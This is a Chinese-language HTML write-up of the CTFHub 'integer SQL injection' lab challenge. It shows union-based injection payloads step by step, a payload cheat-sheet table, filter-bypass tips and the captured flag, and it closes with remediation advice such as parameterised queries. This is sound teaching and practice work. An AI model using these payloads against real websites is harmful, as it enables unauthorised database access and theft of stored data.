@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CTFHub-SQL 整数型注入 Writeup</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",Consolas,monospace;}
+body{background:#0f1118;color:#e2e8f0;padding:24px;line-height:1.8;}
+.container{max-width:900px;margin:0 auto;}
+.back{margin-bottom:16px;}
+.back a{color:#7dd3fc;text-decoration:none;}
+.back a:hover{text-decoration:underline;}
+.glass{background:rgba(30,41,59,0.65);backdrop-filter:blur(12px);border:1px solid rgba(148,163,184,0.2);border-radius:14px;padding:28px;}
+h1{color:#7dd3fc;margin-bottom:12px;font-size:22px;}
+.tag{display:inline-block;background:#1e3a5f;color:#7dd3fc;padding:2px 8px;border-radius:4px;font-size:13px;margin-bottom:20px;}
+h2{color:#93c5fd;font-size:17px;margin:26px 0 10px;}
+h3{color:#7dd3fc;font-size:15px;margin:18px 0 6px;}
+p{margin:8px 0;}
+ul,ol{margin:8px 0 8px 22px;}
+li{margin:4px 0;}
+strong{color:#f8fafc;}
+a{color:#7dd3fc;}
+pre{background:#0b1220;padding:14px;border-radius:8px;border:1px solid #334155;margin:12px 0;white-space:pre-wrap;overflow-wrap:anywhere;}
+code{color:#a5f3fc;font-family:Consolas,monospace;}
+.note{background:rgba(30,64,100,0.35);border-left:3px solid #38bdf8;padding:10px 14px;border-radius:0 8px 8px 0;margin:14px 0;}
+table{width:100%;border-collapse:collapse;margin:14px 0;font-size:14px;}
+th,td{border:1px solid #334155;padding:8px 10px;text-align:left;vertical-align:top;}
+th{background:#1e3a5f;color:#7dd3fc;font-weight:600;white-space:nowrap;}
+tbody tr:nth-child(even){background:rgba(11,18,32,0.55);}
+td code{overflow-wrap:anywhere;}
+tbody td:first-child{white-space:nowrap;color:#93c5fd;}
+.payloads{table-layout:fixed;}
+.payloads th:nth-child(1){width:76px;}
+.payloads th:nth-child(3){width:108px;}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="back"><a href="index.html">← 返回首页</a></div>
+  <div class="glass">
+    <h1>SQL 整数型注入</h1>
+    <div class="tag">WEB | CTFHub</div>
+    <main>
+      <h2>题目描述</h2>
+      <p>页面只有一个 ID 查询框，提交后回显 <code>ID</code> 与 <code>Data</code> 两栏，并且直接把后端执行的 SQL 语句打印在页面上。目标是通过 <code>id</code> 参数注入，拿到数据库里的 flag。</p>
+
+      <h2>环境信息</h2>
+      <table>
+        <tbody>
+          <tr><th>平台</th><td>CTFHub 技能学习</td></tr>
+          <tr><th>题目</th><td>SQL 整数型注入</td></tr>
+          <tr><th>地址</th><td><code>http://challenge-xxxx.sandbox.ctfhub.com:10800/?id=1</code>（沙箱为临时环境，过期需重新申请，域名会变）</td></tr>
+          <tr><th>参数</th><td>GET <code>id</code>，整型</td></tr>
+          <tr><th>后端</th><td>PHP + MySQL，库名 <code>sqli</code></td></tr>
+          <tr><th>关键表</th><td><code>flag(flag)</code></td></tr>
+        </tbody>
+      </table>
+
+      <h2>考点</h2>
+      <ul>
+        <li>整数型 SQL 注入（无需引号闭合）</li>
+        <li>列数判断与 <code>UNION</code> 联合查询回显</li>
+        <li><code>information_schema</code> 元数据查询（库 → 表 → 字段）</li>
+      </ul>
+
+      <h2>漏洞分析</h2>
+      <p>输入任意内容后，页面会把自己的 SQL 语句原样打出来：</p>
+<pre><code>select * from news where id=$id</code></pre>
+      <p><code>$id</code> 直接取自 GET 参数并拼进语句，没有任何过滤，也没有参数化。因为 <code>id</code> 在数据库里是整型，闭合引号这一步都可以省掉，直接把逻辑运算或 <code>union</code> 接在数字后面即可——这就是整数型和字符型注入的唯一区别。</p>
+      <p>另一个有利条件是：页面把查询结果的第一行拆成 <code>ID</code>、<code>Data</code> 两列输出，等于白送两个回显位，<code>union select</code> 的结果能被直接看到，不需要盲注。</p>
+
+      <h2>解题过程</h2>
+
+      <h3>1. 判断注入类型</h3>
+<pre><code>1 and 1=1
+1 and 1=2</code></pre>
+      <p>第一条正常回显 <code>ID: 1</code> / <code>Data: ctfhub</code>，第二条回显直接消失。<code>and</code> 被当成 SQL 逻辑运算执行了，说明注入点成立；而且不需要 <code>'</code> 闭合，属于整数型注入。</p>
+
+      <h3>2. 判断字段数</h3>
+<pre><code>1 order by 2
+1 order by 3</code></pre>
+      <p><code>order by 2</code> 正常，<code>order by 3</code> 无回显（报错被隐去）。所以查询结果共 <strong>2 列</strong>，与页面的 ID / Data 两栏正好对上。</p>
+
+      <h3>3. 定位回显位</h3>
+<pre><code>-1 union select 1,2</code></pre>
+      <p>回显 <code>ID: 1</code> / <code>Data: 2</code>，两个位置都能用。这里用 <code>-1</code> 是为了让左半边查不到记录，否则原记录会占住第一行，<code>union</code> 的结果被挤到第二行，而页面只显示第一行。</p>
+
+      <h3>4. 查当前库名</h3>
+<pre><code>-1 union select 1,database()</code></pre>
+      <p>回显 <code>sqli</code>。</p>
+
+      <h3>5. 查表名</h3>
+<pre><code>-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</code></pre>
+      <p>回显 <code>flag,news</code>，目标表是 <code>flag</code>。</p>
+
+      <h3>6. 查字段名</h3>
+<pre><code>-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag'</code></pre>
+      <p>回显 <code>flag</code>，字段名也叫 <code>flag</code>。</p>
+
+      <h3>7. 取数据</h3>
+<pre><code>-1 union select 1,group_concat(flag) from flag</code></pre>
+      <p><code>Data</code> 栏直接吐出 flag。</p>
+
+      <h2>Payload 速查</h2>
+      <table class="payloads">
+        <thead>
+          <tr><th>步骤</th><th>Payload</th><th>回显</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>验证</td><td><code>1 and 1=2</code></td><td>空白</td></tr>
+          <tr><td>列数</td><td><code>1 order by 2</code></td><td>正常</td></tr>
+          <tr><td>回显位</td><td><code>-1 union select 1,2</code></td><td><code>1</code> / <code>2</code></td></tr>
+          <tr><td>库名</td><td><code>-1 union select 1,database()</code></td><td><code>sqli</code></td></tr>
+          <tr><td>表名</td><td><code>-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</code></td><td><code>flag,news</code></td></tr>
+          <tr><td>字段名</td><td><code>-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag'</code></td><td><code>flag</code></td></tr>
+          <tr><td>数据</td><td><code>-1 union select 1,group_concat(flag) from flag</code></td><td><code>ctfhub{...}</code></td></tr>
+        </tbody>
+      </table>
+
+      <h2>Flag</h2>
+      <div class="note"><code>ctfhub{22ef9c46d40b34b21f1923cc}</code></div>
+
+      <h2>总结踩坑</h2>
+      <ul>
+        <li>必须用 <code>-1</code>（或 <code>0</code>）把原记录顶掉，否则页面只显示第一行，<code>union</code> 结果根本看不到。</li>
+        <li><code>union select</code> 的列数必须严格等于 2，多一列少一列都会报 <code>The used SELECT statements have a different number of columns</code>。</li>
+        <li><code>group_concat</code> 可以一次取全；被过滤时退化成 <code>limit 0,1</code>、<code>limit 1,1</code> 逐条取。</li>
+        <li>空格被过滤可以用 <code>/**/</code> 代替，例如 <code>-1/**/union/**/select/**/1,2</code>；注释用 <code>--+</code> 或 <code>%23</code>。</li>
+        <li>沙箱地址每次申请都会变，写 writeup 时记得同步更新。</li>
+      </ul>
+
+      <h2>修复建议</h2>
+      <ul>
+        <li>使用预编译（参数化查询），不要把参数拼进 SQL 字符串。</li>
+        <li>对数字型参数强制类型转换，例如 PHP 里 <code>$id = intval($_GET['id']);</code>。</li>
+        <li>数据库账号最小权限，业务库不要用 root 连接。</li>
+        <li>生产环境关闭详细报错回显，统一返回错误页。</li>
+      </ul>
+    </main>
+  </div>
+</div>
+</body>
+</html>
